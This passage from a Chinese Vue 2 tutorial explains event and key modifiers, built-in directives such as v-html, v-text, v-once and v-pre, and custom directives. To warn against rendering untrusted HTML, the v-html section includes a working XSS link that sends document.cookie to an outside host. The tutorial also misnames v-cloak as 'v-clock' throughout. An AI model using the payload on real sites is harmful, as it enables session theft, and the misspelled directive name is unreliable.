</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The box of root was clicked...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><strong>事件捕获</strong>：元素的事件触发分为捕获阶段和冒泡阶段。事件触发时先进行事件捕获然后再进行事件冒泡。</p>
<p>捕获阶段事件的传递顺序与冒泡阶段相反。</p>
<p>通常情况下事件是在冒泡阶段中进行处理。</p>
</li>
<li>
<p>多个修饰符可以<strong>串联使用</strong>。</p>
</li>
<li>
<p>使用修饰符时可以不指定事件处理函数。</p>
</li>
</ul>
<h2 id="按键修饰符" data-numberify>按键修饰符<a class="anchor ms-1" href="#按键修饰符"></a></h2>
<p>Vue允许为<code>v-on</code>在监听键盘事件时添加按键修饰符，例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 只有在 keyCode 是 13 时调用 vm.submit() --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">v-on:keyup</span><span class="err">.</span><span class="na">13</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Vue为最常用的按键提供了别名（推荐使用），例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 同上 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">v-on:keyup</span><span class="err">.</span><span class="na">enter</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 缩写语法 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="err">@</span><span class="na">keyup</span><span class="err">.</span><span class="na">enter</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>常用的按键别名有：</p>
<ul>
<li><code>.enter</code></li>
<li><code>.delete </code>（捕获“删除”和“退格”键）</li>
<li><code>.esc</code></li>
<li><code>.space</code></li>
<li><code>.up</code></li>
<li><code>.down</code></li>
<li><code>.left</code></li>
<li><code>.right</code></li>
<li><code>.caps-lock</code></li>
<li><code>.x</code>（例如<code>0-9</code>、<code>a-z</code>这些键盘按键，可以直接使用<code>.</code>加上该按键的名称来使用）</li>
<li>以下按键修饰符在单独使用时，必须配合<code>keydown</code>事件才能正常使用：
<ul>
<li><code>.tab</code></li>
<li><code>.ctrl</code></li>
<li><code>.meta</code>（如Win键、Command键）</li>
<li><code>.shift</code></li>
<li><code>.alt</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>多个按键修饰符也可以连用。</p>
</blockquote>
<p>按键修饰符可以嵌套使用系统修饰键（如<code>ctrl</code>、<code>meta</code>、<code>shift</code>、<code>alt</code>等）的用法：</p>
<ul>
<li>配合<code>keyup</code>使用：按下修饰键的同时，再按下其它非修饰按键，随后释放其它非修饰按键后，事件才能被触发。</li>
<li>配合<code>keydown</code>使用：按下修饰键后立即触发。</li>
</ul>
<p>Vue支持用户自定义的按键别名。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="err">@</span><span class="na">keyup</span><span class="err">.</span><span class="na">huiche</span><span class="o">=</span><span class="s">&#34;keyUp&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 定义按键别名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">keyCodes</span><span class="p">.</span><span class="nx">huiche</span> <span class="o">=</span> <span class="mi">13</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">keyUp</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Content: &#39;</span> <span class="o">+</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Type: &#39;</span> <span class="o">+</span> <span class="nx">event</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="常用指令汇总" data-numberify>常用指令汇总<a class="anchor ms-1" href="#常用指令汇总"></a></h1>
<p>Vue中常用的指令有：</p>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>v-bind</code></td>
<td style="text-align:left">单向数据绑定。语法为<code>v-bind:attr</code>，可简写为<code>:attr</code>。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-model</code></td>
<td style="text-align:left">双向数据绑定。语法为<code>v-model:value</code>，可简写为<code>v-model</code>。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-for</code></td>
<td style="text-align:left">循环指令。可用于遍历数组、对象、字符串等。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-on</code></td>
<td style="text-align:left">绑定事件处理器。语法为<code>v-on:event</code>，可简写为<code>@event</code>。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-if</code></td>
<td style="text-align:left">条件渲染，可动态控制节点是否存在。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-else-if</code></td>
<td style="text-align:left">条件渲染，可动态控制节点是否存在。在使用了<code>v-if</code>或<code>v-else-if</code>指令的元素的后续元素中使用。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-else</code></td>
<td style="text-align:left">条件渲染，可动态控制节点是否存在。在使用了<code>v-if</code>或<code>v-else-if</code>指令的元素的后续元素中使用。</td>
</tr>
<tr>
<td style="text-align:center"><code>v-show</code></td>
<td style="text-align:left">条件渲染，可动态控制节点是否存在。与<code>v-if</code>、<code>v-else-if</code>和<code>v-else</code>系列指令不同的是，<code>v-show</code>仅支持单分支条件判断。</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="其它内置指令" data-numberify>其它内置指令<a class="anchor ms-1" href="#其它内置指令"></a></h1>
<h3 id="输出-html" data-numberify>输出 HTML<a class="anchor ms-1" href="#输出-html"></a></h3>
<p>使用<code>v-html</code>，可以将HTML代码插入到标签中。<code>v-html</code>的用法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>Hello World!<span class="c">&lt;!-- 原本的标签内容会被 v-html 所覆盖 --&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;&lt;h2&gt;Hello Vue.js!&lt;/h2&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-html</code>存在安全性问题。在使用<code>v-html</code>插入Html代码时，有可能会被其它别有用心的人利用，在页面中插入一些不安全的代码。例如通过<code>v-html</code>获取他人浏览器的Cookie：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;link&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// baidu.com 可以替换成其它非法获取别人浏览器 cookie 的服务器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">link</span><span class="o">:</span> <span class="s1">&#39;&lt;a href=javascript:location.href=&#34;http://baidu.com?&#34;+document.cookie&gt;跳转链接&lt;/a&gt;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>点击链接后，浏览器在当前服务器中存储的Cookie（没有被<code>HttpOnly</code>字段限制的Cookie）会被毫无保留地传递到<code>baidu.com</code>这个服务器中。</p>
<blockquote>
<p>注：</p>
<ul>
<li>在网站上动态渲染任意Html是非常危险的，容器导致XSS攻击。</li>
<li>一定要在可信的内容上使用<code>v-html</code>，永远不要在用户提交的内容上使用。</li>
</ul>
</blockquote>
<h3 id="输出文本" data-numberify>输出文本<a class="anchor ms-1" href="#输出文本"></a></h3>
<p>使用<code>v-text</code>，可以将文本插入到标签中。其用法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;msg&#34;</span><span class="p">&gt;</span><span class="c">&lt;!-- 原本的标签内容会被 v-text 所覆盖 --&gt;</span><span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-text</code>与<code>v-html</code>不同的是，<code>v-text</code>不能插入Html内容。</p>
<h3 id="v-clock" data-numberify>v-clock<a class="anchor ms-1" href="#v-clock"></a></h3>
<p><code>v-clock</code>可以有效防止当网络存在问题时，浏览器直接将未解析的Vue模板展示给用户。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">[</span><span class="nt">v-clock</span><span class="o">]</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">display</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-clock</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-clock</code>的原理是：通过CSS属性选择器，将带有<code>v-clock</code>属性的元素设置为<code>display: none</code>，所以一开始页面中设置了<code>v-clock</code>属性的元素并不会展示在页面中。而Vue实例在接管Vue模板的一瞬间，会将模板中所有元素的<code>v-clock</code>属性给移除。当网速过慢时，浏览器不会直接将Vue模板的所有内容展示给用户，而是在浏览器成功请求到Vue之后，Vue实例将<code>v-clock</code>属性给移除，页面才正常展示。</p>
<p><code>v-clock</code>指令并没有值，其本质是一个特殊属性：</p>
<ul>
<li>Vue实例创建完毕并接管容器后，会删除模板中所有元素的<code>v-clock</code>属性。</li>
<li><code>v-clock</code>配合CSS属性选择器使用可以解决网速过慢时页面直接展示出未经处理的Vue模板问题。</li>
</ul>
<h3 id="v-once" data-numberify>v-once<a class="anchor ms-1" href="#v-once"></a></h3>
<p><code>v-once</code>用于让页面中的Vue数据始终显示为初始数据。<code>v-once</code>同样是没有值的特殊属性。</p>
<ul>
<li><code>v-once</code>所在节点在初次动态渲染后，就视为静态内容。</li>
<li>后续数据的改变不会引起<code>v-once</code>所在结构的更新，可以用于优化性能。</li>
</ul>
<p>示例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-once</span><span class="p">&gt;</span>Original Number: {{num}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Current Number: {{num}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;num++&#34;</span><span class="p">&gt;</span>Number+1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="v-pre" data-numberify>v-pre<a class="anchor ms-1" href="#v-pre"></a></h3>
<p><code>v-pre</code>指令：</p>
<ul>
<li><code>v-pre</code>可以跳过其所在节点的编译过程。</li>
<li>可利用<code>v-pre</code>跳过没有使用指令语法、没有使用插值语法的节点，可以加快页面的编译。</li>
<li><code>v-pre</code>没有值，直接在Html元素中指定即可。</li>
</ul>
<hr>
<h1 id="自定义指令" data-numberify>自定义指令<a class="anchor ms-1" href="#自定义指令"></a></h1>
<p>从指令的作用域来看，Vue中有两种指令：</p>
<ul>
<li>
<p>全局指令：可以在所有Vue实例中使用的指令。</p>
<p>全局指令可以分成以下两种：</p>
<ul>
<li>Vue内置指令。</li>
<li>用户自定义全局指令。</li>
</ul>
</li>
<li>
<p>局部指令（用户自定义局部指令）：仅能在当前Vue实例中使用的指令。</p>
</li>
</ul>
<h2 id="局部自定义指令" data-numberify>局部自定义指令<a class="anchor ms-1" href="#局部自定义指令"></a></h2>
<p>Vue.js 自定义指令可以通过在Vue实例中配置<code>directives</code>来定义局部指令。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Current Number: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;num&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>10 Times Number: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-big</span><span class="o">=</span><span class="s">&#34;num&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-fbind:value</span><span class="o">=</span><span class="s">&#34;num&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;num++&#34;</span><span class="p">&gt;</span>Number+1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="o">:</span> <span class="mi">66</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">directives</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 添加 v-big 指令（简写形式）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">big</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The v-big was executed.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// console.log(element);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// console.log(binding);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">element</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span> <span class="o">*</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 配置对象写法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">fbind</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 绑定成功时赋上 value 值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">bind</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// console.log(&#39;v-fbind bound.&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 指令所在元素被插入页面时调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">inserted</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// console.log(&#39;v-fbind inserted.&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">element</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 更新时给 value 赋值并获取焦点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">update</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// console.log(&#39;v-fbind updated.&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
</span></span><span class="line"><span class="cl">          <span class="nx">element</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Vue中每条指令都必须以<code>v-</code>作为前缀（如上<code>v-big</code>和<code>v-fbind</code>）。但是在<code>directives</code>中定义指令时，不能加入<code>v-</code>前缀（如上<code>v-big</code>指令在<code>directives</code>中的定义是<code>big</code>，<code>v-fbind</code>指令在<code>directives</code>中的定义是<code>fbind</code>）。</p>
<h2 id="指令配置的写法" data-numberify>指令配置的写法<a class="anchor ms-1" href="#指令配置的写法"></a></h2>
<p>指令的配置有两种写法：</p>
<ul>
<li>
<p>配置对象写法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">command</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 指令与元素成功绑定时（页面初始化时）调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">bind</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 指令所在元素被插入页面时调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">inserted</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 指令所在的模板被重新解析时调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">update</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div></li>
<li>
<p>函数式写法（简写形式）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">command</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>指令函数被调用的时机：</p>
<ul>
<li>指令与元素成功绑定时（初始化时）。相当于<code>bind()</code>的调用时机。</li>
<li>指令所在的模板被重新解析时。相当于<code>update()</code>的调用时机。</li>
</ul>
</li>
</ul>
